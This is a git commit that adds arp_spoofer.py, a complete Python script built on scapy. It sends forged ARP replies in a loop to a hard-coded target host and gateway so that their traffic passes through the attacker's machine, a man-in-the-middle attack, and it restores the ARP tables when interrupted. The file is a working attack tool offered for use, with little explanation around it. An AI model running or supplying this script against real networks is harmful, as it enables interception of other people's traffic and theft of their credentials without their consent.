3b2310bcbb6f08d7c6ceddb1065ba0d23010c067
shadowleaks <65437425+shadowleaks@users.noreply.github.com>
2020-06-18 09:28:01 +0530

    Create arp_spoofer.py

---
+++ arp_spoofer.py
@@ -0,0 +1,46 @@
+#!/bin/python
+
+import scapy.all as scapy
+import time
+import sys
+
+def get_mac(ip):
+	arp_request = scapy.ARP(pdst=ip)    #creating object
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+	arp_request_broadcast = broadcast/arp_request  #combine both ip and mac
+	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False ) [0]
+	
+	return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+	target_mac = get_mac(target_ip)
+	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+	scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+	destination_mac = get_mac(destination_ip)
+	source_mac = get_mac(source_ip)
+	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+	scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "192.168.56.152"
+gateway_ip = "192.168.56.2"
+
+
+
+try:
+	sent_packet_count = 0
+	while True:
+		spoof(target_ip, gateway_ip) #it fools like router
+		spoof(gateway_ip, target_ip) #it fools like client
+		sent_packet_count = sent_packet_count + 2
+		print("\r [+] packet sent: " + str(sent_packet_count)),	#print from always from starting point
+		sys.stdout.flush()  
+		time.sleep(2)
+
+except KeyboardInterrupt:
+	print("\n[+] Detected ctrl+c  ........ quitting\n")
+	restore(target_ip, gateway_ip)
+	restore(gateway_ip, target_ip)
+
